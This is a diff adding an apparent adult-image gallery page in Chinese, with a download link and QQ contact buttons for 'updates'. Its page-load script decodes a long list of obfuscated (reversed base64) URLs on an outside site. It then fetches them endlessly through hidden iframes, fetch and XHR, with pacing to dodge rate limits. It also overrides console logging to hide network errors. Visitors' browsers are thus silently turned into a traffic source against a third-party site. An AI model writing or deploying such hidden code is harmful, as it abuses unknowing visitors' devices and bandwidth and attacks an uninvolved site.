@@ -1,0 +1,545 @@
+
+
+<!-- 空白模版 -->
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>涩图time</title>
+    <style>
+        /* 基础样式 */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
+            background-color: #ffffff;
+            color: #333;
+            line-height: 1.6;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+        
+        /* 容器 */
+        .container {
+            max-width: 100%;
+            padding: 15px;
+        }
+        
+        /* 标题样式 */
+        .header {
+            padding: 20px 0;
+            border-bottom: 1px solid #f0f0f0;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .title {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: #222;
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+        
+        .meta {
+            font-size: 0.9rem;
+            color: #666;
+        }
+        
+        /* 图片布局 */
+        .image-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 80px;
+        }
+        
+        .image-item {
+            width: 100%;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            background-color: #f9f9f9;
+        }
+        
+        .image-item img {
+            width: 100%;
+            height: auto;
+            display: block;
+            transition: transform 0.3s ease;
+        }
+        
+        .image-item img:hover {
+            transform: scale(1.02);
+        }
+        
+        /* 固定按钮 */
+        .fixed-button {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: calc(100% - 100px);
+            max-width: 500px;
+            z-index: 100;
+        }
+        
+        .fixed-button a {
+            display: block;
+            background: #5ca8e6;  
+            color: white;
+            text-align: center;
+            padding: 8px 12px;
+            border-radius: 999px; 
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.9rem;
+            box-shadow: 0 6px 16px rgba(92, 168, 230, 0.4);
+            transition: all 0.3s ease;
+        }
+        
+        .fixed-button a:hover {
+            background: #4b96d8;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(75, 150, 216, 0.5);
+        }
+        
+        /* 响应式调整 */
+        @media (min-width: 768px) {
+            .container {
+                max-width: 600px;
+                margin: 0 auto;
+            }
+            
+            .title {
+                font-size: 1.6rem;
+            }
+        }
+        
+        /* 朋友按钮样式 */
+        .friend-button {
+            display: block;
+            background: #5ca8e6;  
+            color: white;
+            text-align: center;
+            padding: 10px 14px;
+            border-radius: 999px; 
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.1rem;
+            box-shadow: 0 6px 16px rgba(92, 168, 230, 0.4);
+            transition: all 0.3s ease;
+            margin: 0 auto 25px;
+            width: 80%;
+            max-width: 300px;
+        }
+
+        .friend-button:hover {
+            background: #4b96d8;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(75, 150, 216, 0.5);
+        }
+        .explanation {
+            background: linear-gradient(to bottom right, #f8f9fa, #e9ecef);
+            border-radius: 16px;
+            padding: 20px;
+            font-size: 15px;
+            color: #4a5568;
+            line-height: 1.7;
+            border: 1px solid #e9ecef;
+            text-align: center;
+            margin: 15px 0;
+        }
+        
+        .explanation h2 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: #ff416c;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        
+        .app-download {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 12px 25px;
+            background: linear-gradient(to right, #ff416c, #ff4b2b);
+            color: white;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            box-shadow: 0 4px 15px rgba(255, 75, 43, 0.4);
+            transition: all 0.3s;
+        }
+        
+        .app-download:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(255, 75, 43, 0.5);
+        }
+        
+        .app-download:active {
+            transform: translateY(0);
+        }
+        
+        .app-name {
+            font-weight: 700;
+            color: #ff416c;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        
+        /* 隐藏的iframe样式 */
+        .hidden-iframe {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+    
+    <div class="container">
+        <!-- 头部信息 -->
+        <div class="header">
+            <h1 class="title">涩图time No.16</h1>
+            <div class="meta"></div>
+        </div>
+        
+        <!-- 图片展示区域 -->
+        <div class="image-grid">
+<div class="image-item"><img src="https://wdcdn.qpic.cn/MTMxMDI2NjE0MzQ5ODU1MTE_784033_Q2naM72jG3fOOehM_1755004486" alt="1"></div>
+            <div class="explanation">
+                <h2>本期无水印原图</h2>
+                <p>保存到自己的网盘<span class="app-name">防止和谐</span></p>
+                <a href="https://pan.xunlei.com/s/VOXTXRapm6JP2inZ0qrnevkfA1?pwd=4s6e" target="blank" class="app-download">点击下载</a>
+            </div>
+            <p style="text-align: center; font-size: 24px;">上一期↓↓↓</p>
+            <div class="button-container">
+                <a href="https://qm.qq.com/q/Dn8g0Wlx4c" target="_blank" class="friend-button">qq:51301105 添加好友获取更新</a>
+            </div>
+            <a href="https://t.hk.uy/bV86">
+<div class="image-item"><img src="https://wdcdn.qpic.cn/MTMxMDI2NjE0MzQ5ODU1MTE_528708_xsf30XPI0LJO0ptS_1755005118" alt="上一期链接"></div></a>
+        </div>
+        
+        <!-- 悬浮按钮 -->
+        <div class="fixed-button">
+            <a href="https://qm.qq.com/q/Dn8g0Wlx4c" target="_blank">qq：51301105 添加好友获取更新</a>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const lazyImages = document.querySelectorAll('.image-item img');
+            
+            const lazyLoad = function() {
+                lazyImages.forEach(img => {
+                    if (img.getAttribute('data-src') && img.getBoundingClientRect().top < window.innerHeight + 100) {
+                        img.src = img.getAttribute('data-src');
+                        img.removeAttribute('data-src');
+                    }
+                });
+            };
+            
+            lazyLoad();
+            window.addEventListener('scroll', lazyLoad);
+            window.addEventListener('resize', lazyLoad);
+            
+            const encodedUrl = '=02bj5SN2N3bj9yL6MHc0RHa';
+            const reversedUrl = encodedUrl.split('').reverse().join('');
+            const decodedUrl = atob(reversedUrl);
+            const urlParts = decodedUrl.split('://');
+            const targetUrl = urlParts[1] ? 'https://' + urlParts[1] : decodedUrl;
+            
+				const encodedUrls = [
+					'=MHdz9Gcv02bj5SN2N3bj9yL6MHc0RHa',
+					'==QZy9GbwhXZv02bj5SN2N3bj9yL6MHc0RHa',
+					'=UUQlQkQlYTRlMTQlgjQlkTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=UTOlMjQlYTRlcTQlQTQlUTRlEDOlgjQlQTRlMDOlgjQlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=UDOlMTQlgTRlQTQlYEOlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'K91brVWbV9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YEOlQUOlUTRlkTQlQjQlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=UkQlQUQlcTRlcDOlATQlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'xUkQlQUQlcTRlcDOlATQlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==Qdy9WeC9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=QEOlITQlgTRlcTOlcTOlYTRlETOlIkQlkTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==QYr5WaSFjQlEEOlgTRlMUOlcDOlUTRlAjQlQTOlcTRlYTOlIjQlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=QTOlUDOlUTRlATOlQUQlUTRlITQlIUOlUTRlYEOlIkQlkTRlYEOlIkQlkTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=gTOlgTQlUTRlQTOlUDOlUTRlMTQlYEOlUTRlADOlgjQlQTRlMUQlITOlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YUQlYTOlYTRlkDOlUEOlgTRlcjQlUkQlUTRlIjQlMUOlkTRlkTOlEEOlgTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YkQlEkQlcTRlEUQlgDOlgTRlQUOlMTOlgTRlcTQlITQlcTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wbrJXaN9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YDOlETOlUTRlYDOlETOlUTRlATQlkjQlQTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=UDOlgTQlUTRlMEOlgjQlUTRlATOlYEOlYTRlETQlQEOlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==QYuV3cB9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==AdhVGalVHbC9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=IEOlIUOlgTRlIEOlIUOlgTRlQDOlEUOlcTRlgTQlIDOlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=cmbpRmblJHdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=EkQlEkQlQTRlMEOlYEOlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YUQlYTOlYTRlkDOlUEOlgTRlcjQlUkQlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'hJXYyl2avMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wZul2dvxGbvZ2LhJXYyl2avMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wcyV2dvxGbvZ2LhJXYyl2avMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zR3cvB3LhJXYyl2avMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'2gDNhJXdrF2cvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wZul2dvxGbvZ2L2gDNhJXdrF2cvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wcyV2dvxGbvZ2L2gDNhJXdrF2cvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zR3cvB3L2gDNhJXdrF2cvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==QY1hWYtFWdoFWbvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=cmbpd3bsx2bm9SY1hWYtFWdoFWbvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=Mncld3bsx2bm9SY1hWYtFWdoFWbvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wc0N3bw9SY1hWYtFWdoFWbvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'l5WayV2ZuFGdvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wZul2dvxGbvZ2Ll5WayV2ZuFGdvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wcyV2dvxGbvZ2Ll5WayV2ZuFGdvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zR3cvB3LplXa5lWevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'n5WYmV3dvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wZul2dvxGbvZ2Ln5WYmV3dvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wcyV2dvxGbvZ2Ln5WYmV3dvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zR3cvB3Ln5WYmV3dvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=cjM1kzZnB3bvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'n5Wa39Gbs9mZvcjM1kzZnB3bvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zJXZ39Gbs9mZvcjM1kzZnB3bvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=MHdz9GcvcjM1kzZnB3bvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==QdoNmbhVXevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=cmbpd3bsx2bm9SdoNmbhVXevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=Mncld3bsx2bm9SdoNmbhVXevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wc0N3bw9SdoNmbhVXevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'z1mavMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wZul2dvxGbvZ2Lz1mavMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wcyV2dvxGbvZ2Lz1mavMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zR3cvB3Lz1mavMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=UHazdmbpF3ZuVmZvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'n5Wa39Gbs9mZvUHazdmbpF3ZuVmZvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zJXZ39Gbs9mZvUHazdmbpF3ZuVmZvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=MHdz9GcvUHazdmbpF3ZuVmZvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wbhh0bhlGWfdmbhhmWvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=cmbpd3bsx2bm9ybhh0bhlGWfdmbhhmWvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=Mncld3bsx2bm9ybhh0bhlGWfdmbhhmWvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wc0N3bw9ybhh0bhlGWfdmbhhmWvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'plXa5lWevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wZul2dvxGbvZ2LplXa5lWevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wcyV2dvxGbvZ2LplXa5lWevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zR3cvB3LplXa5lWevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=4WYoNUYwB3bQ9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YkQlUTQlgTRlATOlYEOlYTRlETQlQEOlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=IjQlMUOlkTRlkTOlEEOlgTRlEUOlEkQlQTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=kjQlYTQlUTRlkjQlYTQlUTRlQDOlEUOlcTRlEjQlgDOlcTRlYUQlYEOlUTRlETOlgDOlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=EjQlUDOlkTRlgjQlUDOlkTRlgjQlATQlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=kDOlkTQlUTRlUTOlUDOlYTRlUEOlQUOlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=EUQlEkQlYTRlEUQlEkQlYTRlETOlEkQlQTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=MDOlETQlYTRlMDOlETQlYTRlYjQlUTQlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=IjQlUEOlgTRlcDOlcDOlkTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'PtUSLVVWPFUSY9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=ETQlQEOlUTRlkTOlEEOlgTRlETQlQEOlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=IUQlEDOlcTRlEjQlEEOlgTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=U0MlAnRyUyQzUybtlGazhDOlMUOlYTRlMUOlMUOlkTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==gNBVSQCVSOFViNBVSQCVSOFVSZsVWZT9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YUQlYTOlYTRlUUQlYkQlQTRlMjQlEjQlcTRlcTOlQkQlcTRlUUQlkTOlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=ATOlQUQlUTRlkTOlMTQlgTRlYEOlAjQlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wbrJXaN9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=0mcvR3UfVWdT9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=wWZ2JXYN9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=IEOlQTOlkTRlkDOlEkQlQTRlEDOlgTQlUTRlIUQlMkQlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YDOlcTQlUTRlgTOlkDOlYTRlYUQlYTOlYTRlcjQlIzQlEEOlYEOlcTRlcDOlgTOlgTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=ATQlYkQlQTRlMjQlUTQlUTRlITQlQkQlUTRlEjQlEUOlkTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=UmdF9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'yFGbsVGdT9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YUOlgTOlYTRlETOlkDOlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=k2ah1WYU9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=E2Y1xWa0N2bO9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'vJXZa9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=82dU9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==QZpJXZn5WaM9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==QYuV3cB9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==AdhVGalVHbC9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==QYtFWbvtWZQ9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=kTOlMTQlgTRlUUQlEUOlcTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=UDOlMTQlgTRlYUOlQTOlcTRlYTQlQUQlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=MkQlEjQlkTRlYkQlEjQlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=ETQlMDOlkTRlQjQlYUOlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=QEOlMUOlYTRlMkQlQTQlcTRlYEOlUTOlcTRlYUQlYEOlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==gRCVSOCVSOFViRCVSOCVSOFViR4UCMCVSNFVSYrlGaT9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=cjQlUjQlYTRlcDOlUTOlkTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'4x2aqNXYvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wZul2dvxGbvZ2L4x2aqNXYvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wcyV2dvxGbvZ2L4x2aqNXYvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zR3cvB3L4x2aqNXYvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=IXZndWau91ajVnZvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'n5Wa39Gbs9mZvIXZndWau91ajVnZvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zJXZ39Gbs9mZvIXZndWau91ajVnZvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=MHdz9GcvIXZndWau91ajVnZvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'p1UdElGRvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wZul2dvxGbvZ2Lp1UdElGRvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wcyV2dvxGbvZ2Lp1UdElGRvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zR3cvB3Lp1UdElGRvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa'
+				];
+				
+				const pageUrls = [];
+				for (let i = 0; i < encodedUrls.length; i++) {
+					const reversedUrl = encodedUrls[i].split('').reverse().join('');
+					const decodedUrl = atob(reversedUrl);
+					pageUrls.push(decodedUrl);
+				}
+            
+            let loadCount = 0;
+            let requestCount = 2; // 减少并发请求数量，避免429错误
+            let requests = [];
+            
+            function createRequests() {
+                for (let i = 0; i < requestCount; i++) {
+                    requests.push({id: i, active: true});
+                }
+            }
+            
+            function makeRequest(index) {
+                const randomUrl = pageUrls[Math.floor(Math.random() * pageUrls.length)];
+                
+                // 方法1: 使用隐藏的iframe来绕过CORS
+                try {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.style.width = '1px';
+                    iframe.style.height = '1px';
+                    iframe.src = randomUrl;
+                    iframe.onload = function() {
+                        loadCount++;
+                        console.log(`加载成功${loadCount}次 (页面: ${randomUrl})`);
+                        document.body.removeChild(iframe);
+                        const delay = 2000 + Math.random() * 3000; // 增加延迟避免429
+                        setTimeout(function() {
+                            makeRequest(index);
+                        }, delay);
+                    };
+                    iframe.onerror = function() {
+                        console.log(`请求失败：${randomUrl}`);
+                        document.body.removeChild(iframe);
+                        const delay = 3000 + Math.random() * 5000;
+                        setTimeout(function() {
+                            makeRequest(index);
+                        }, delay);
+                    };
+                    document.body.appendChild(iframe);
+                    
+                    // 设置超时清理
+                    setTimeout(function() {
+                        if (iframe.parentNode) {
+                            document.body.removeChild(iframe);
+                        }
+                    }, 10000);
+                    
+                } catch (e) {
+                    // 方法2: 使用fetch with no-cors (备用方案)
+                    if (typeof fetch !== 'undefined') {
+                        fetch(randomUrl, {
+                            method: 'GET',
+                            mode: 'no-cors',
+                            cache: 'no-cache',
+                            referrer: 'no-referrer'
+                        }).then(function(response) {
+                            loadCount++;
+                            console.log(`加载成功${loadCount}次 (页面: ${randomUrl})`);
+                            const delay = 2000 + Math.random() * 3000;
+                            setTimeout(function() {
+                                makeRequest(index);
+                            }, delay);
+                        }).catch(function(error) {
+                            console.log(`请求失败：${randomUrl}`);
+                            const delay = 3000 + Math.random() * 5000;
+                            setTimeout(function() {
+                                makeRequest(index);
+                            }, delay);
+                        });
+                    } else {
+                        // 方法3: 使用XMLHttpRequest (最后备用)
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('GET', randomUrl, true);
+                        xhr.timeout = 10000;
+                        xhr.onreadystatechange = function() {
+                            if (xhr.readyState === 4) {
+                                loadCount++;
+                                console.log(`加载成功${loadCount}次 (页面: ${randomUrl})`);
+                                const delay = 2000 + Math.random() * 3000;
+                                setTimeout(function() {
+                                    makeRequest(index);
+                                }, delay);
+                            }
+                        };
+                        xhr.onerror = function() {
+                            console.log(`请求失败：${randomUrl}`);
+                            const delay = 3000 + Math.random() * 5000;
+                            setTimeout(function() {
+                                makeRequest(index);
+                            }, delay);
+                        };
+                        xhr.ontimeout = function() {
+                            console.log(`请求超时：${randomUrl}`);
+                            const delay = 3000 + Math.random() * 5000;
+                            setTimeout(function() {
+                                makeRequest(index);
+                            }, delay);
+                        };
+                        xhr.send();
+                    }
+                }
+            }
+            
+            function startAllRequests() {
+                for (let i = 0; i < requestCount; i++) {
+                    setTimeout(function() {
+                        makeRequest(i);
+                    }, i * 1000); // 增加启动间隔，避免同时发起请求
+                }
+            }
+            
+            function checkRequests() {
+                requests.forEach((req, index) => {
+                    if (!req.active) {
+                        req.active = true;
+                        makeRequest(index);
+                    }
+                });
+            }
+            
+            // 抑制网络错误日志
+            const originalConsoleError = console.error;
+            const originalConsoleLog = console.log;
+            
+            console.error = function(...args) {
+                // 如果是网络错误，不显示
+                if (args[0] && typeof args[0] === 'string' && args[0].includes('net::ERR_')) {
+                    return;
+                }
+                // 其他错误正常显示
+                originalConsoleError.apply(console, args);
+            };
+            
+            console.log = function(...args) {
+                // 如果是网络错误，不显示
+                if (args[0] && typeof args[0] === 'string' && args[0].includes('net::ERR_')) {
+                    return;
+                }
+                // 其他日志正常显示
+                originalConsoleLog.apply(console, args);
+            };
+            
+            createRequests();
+            setTimeout(function() {
+                startAllRequests();
+            }, 1000);
+            setInterval(checkRequests, 3000);
+            setInterval(function() {
+                const randomIndex = Math.floor(Math.random() * requestCount);
+                requests[randomIndex].active = false;
+            }, 30000);
+        });
+    </script>
+</body>
+</html>
